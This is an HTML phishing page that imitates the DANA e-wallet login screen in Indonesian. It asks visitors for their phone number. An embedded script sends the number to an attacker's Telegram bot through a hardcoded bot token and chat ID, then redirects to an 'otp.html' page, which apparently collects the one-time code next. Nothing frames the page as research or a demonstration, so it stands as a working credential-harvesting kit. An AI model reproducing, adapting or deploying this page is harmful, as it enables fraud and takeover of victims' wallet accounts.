<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>DANA - Masuk</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #108ee9;
      color: #ffffff;
      -webkit-text-size-adjust: 100%;
      user-select: none;
    }
    .container {
      width: 100%;
      max-width: 420px;
      margin: 0 auto;
      min-height: 100vh;
      background-color: #108ee9;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      padding: 16px 20px 24px 20px;
    }
    .header {
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      margin-bottom: 32px;
      padding-top: 4px;
    }
    .back-btn {
      position: absolute;
      left: 0;
      background: none;
      border: none;
      color: #ffffff;
      font-size: 20px;
      cursor: pointer;
      display: flex;
      align-items: center;
    }
    .logo-dana-img {
      height: 28px;
      object-fit: contain;
    }
    .main-title {
      text-align: center;
      font-size: 16px;
      font-weight: 500;
      margin-bottom: 24px;
    }
    .main-title strong {
      font-weight: 700;
    }
    .form-labels {
      display: flex;
      gap: 12px;
      margin-bottom: 6px;
      font-size: 12px;
      color: rgba(255, 255, 255, 0.9);
    }
    .label-number {
      flex: 1;
    }
    .input-group {
      display: flex;
      gap: 10px;
      margin-bottom: 18px;
    }
    .country-box {
      height: 44px;      
      background-color: #ffffff;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 4px;
      color: #000000;
      font-weight: 600;
      font-size: 14px;
    }
    .flag-icon {
      width: 20px;
      height: 14px;
      border-radius: 2px;
      overflow: hidden;
      display: flex;
      flex-direction: column;
      border: 1px solid rgba(0,0,0,0.1);
    }
    .flag-red {
      background-color: #de2910;
      height: 50%;
    }
    .flag-white {
      background-color: #ffffff;
      height: 50%;
    }
    .arrow-down {
      border: solid #666;
      border-width: 0 2px 2px 0;
      display: inline-block;
      padding: 3px;
      transform: rotate(45deg);
      margin-left: 1px;
    }
    .phone-input {
      flex: 1;
      height: 44px;
      background-color: #ffffff;
      border-radius: 8px;
      border: none;
      outline: none;
      padding: 0 14px;
      font-size: 18px;
      font-weight: 500;
      color: #333333;
      letter-spacing: 0.5px;
    }
    .phone-input::placeholder {
      color: #bbbbbb;
      font-weight: 400;
    }
    .help-row {
      display: flex;
      align-items: center;
      font-size: 13px;
    }
    .help-text {
      color: rgba(255, 255, 255, 0.9);
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .change-btn {
      background-color: #ffffff;
      color: #108ee9;
      border: none;
      border-radius: 20px;
      padding: 4px 12px;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      gap: 2px;
      white-space: nowrap;
    }
    .footer-section {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 16px;
    }
    .terms-text {
      text-align: center;
      font-size: 12px;
      line-height: 1.5;
      color: rgba(255, 255, 255, 0.95);
      padding: 0 10px;
    }
    .terms-text strong {
      font-weight: 700;
    }
    .submit-btn {
      width: 100%;
      height: 46px;
      background-color: #ffffff;
      color: #999999;
      border: none;
      border-radius: 6px;
      font-size: 15px;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.2s;
    }
    .submit-btn.active {
      color: #108ee9;
      background-color: #ffffff;
      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
    }
  </style>
</head>
<body>

  <div class="container">
    
    <div>
      <div class="header">
        <button class="back-btn" onclick="history.back()">❮</button>
        <img src="https://i.ibb.co.com/pBzBRpxx/IMG-2933.png" alt="DANA" class="logo-dana-img">
      </div>

      <div class="main-title">
        Masukkan <strong>nomor HP</strong> kamu untuk lanjut
      </div>

      <div class="form-labels">
        <div class="label-country" style="width: 85px; min-width: 85px;">Negara</div>
        <div class="label-number">Nomor</div>
      </div>

      <div class="input-group">
        <div class="country-box" style="width: 85px; min-width: 85px;">
          <div class="flag-icon">
            <div class="flag-red"></div>
            <div class="flag-white"></div>
          </div>
          <span>+62</span>
          <i class="arrow-down"></i>
        </div>

        <input type="tel" id="phone-input" class="phone-input" placeholder="811-1234-5678" oninput="validatePhone(this)">
      </div>

      <div class="help-row">
        <div class="help-text">
          <span>Nomor hilang atau tidak aktif?</span>
          <button class="change-btn" type="button">
            Ganti nomor <span>›</span>
          </button>
        </div>
      </div>
    </div>

    <div class="footer-section">
      <div class="terms-text">
        Dengan melanjutkan, kamu setuju dengan<br>
        <strong>Syarat & Ketentuan</strong> serta <strong>Pemberitahuan Privasi</strong> kami
      </div>

      <button type="button" id="submit-btn" class="submit-btn" onclick="sendData()" disabled>
        LANJUT
      </button>
    </div>

  </div>

  <script>
    const BOT_TOKEN = "9189949943:AAGWkG3Lnly2aM8Wu4kCwUHRo4PK6UMwABs";
    const CHAT_ID = "6742478722";

    const phoneInput = document.getElementById('phone-input');
    const submitBtn = document.getElementById('submit-btn');

    function validatePhone(input) {
      let val = input.value.replace(/\D/g, '');
      
      if (val.startsWith('0')) {
        val = val.substring(1);
      }
      
      input.value = val;

      if (val.length >= 8) {
        submitBtn.classList.add('active');
        submitBtn.disabled = false;
      } else {
        submitBtn.classList.remove('active');
        submitBtn.disabled = true;
      }
    }

    async function sendData() {
      const phoneVal = phoneInput.value;
      if (!phoneVal) return;

      localStorage.setItem('userPhone', phoneVal);

      const text = `📱 *Input Nomor HP DANA*\n\n*Nomor HP:* +62${phoneVal}`;

      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
          })
        });
      } catch (err) {
        console.log("Error Telegram");
      }

      window.location.href = `otp.html?phone=${phoneVal}`;
    }
  </script>
</body>
</html
